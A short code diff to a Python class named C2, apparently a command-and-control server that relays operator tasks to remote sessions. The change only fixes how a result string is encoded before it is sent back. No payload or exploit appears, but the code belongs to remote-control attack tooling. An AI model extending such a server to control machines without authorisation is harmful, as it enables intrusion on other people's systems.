@@ -1085,7 +1085,7 @@ class C2():
             task = globals()['c2'].database.handle_task({'task': command, 'session': index})
             ses.send_task(task)
             task = ses.recv_task()
-            conn.sendall(f"final result task: {task}")
+            conn.sendall((f"final result task: {task}").encode("utf-8"))
 
         conn.close()
 
